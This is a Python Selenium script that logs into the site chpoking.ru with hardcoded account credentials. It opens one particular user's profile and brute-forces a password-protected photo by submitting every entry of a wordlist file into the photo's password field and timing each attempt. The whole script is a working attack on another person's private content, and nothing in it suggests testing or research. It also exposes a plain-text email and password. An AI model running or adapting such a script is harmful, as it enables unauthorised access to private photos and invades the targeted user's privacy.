from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

import time
import pyperclip

f = open('lib.txt', 'r')
l = [line.strip() for line in f]

def main():
    drv = webdriver.Chrome()
    #drv = webdriver.PhantomJS()
    drv.get("http://chpoking.ru/")
    login_auth = drv.find_element_by_name("email")
    login_auth.send_keys("d1913125@urhen.com")
    pwd_auth = drv.find_element_by_name("passwd")
    pwd_auth.send_keys("Qe5jE5Ma")
    button = drv.find_element_by_name("submit")
    button.click()
    drv.get("http://chpoking.ru/usr5377858/")
    #photo1 = drv.find_element_by_xpath("//img[contains(@src='resources/images/logout.png')]/parent::a").click()
    photo1 = drv.find_element_by_id("userOid_1057229477_oid_68018156_offset_0_")
    photo1.click()
    img_pwd = drv.find_element_by_name("hp_passwd")
    for i in l:
        cur_time = time.time()
        img_pwd.clear()
        img_pwd.send_keys(i)
        img_pwd.send_keys(Keys.RETURN)
        print(i)
        time_after = time.time()
        print(time_after - cur_time)
        #time.sleep(1)


    time.sleep(1)


if __name__ == "__main__":
    main()
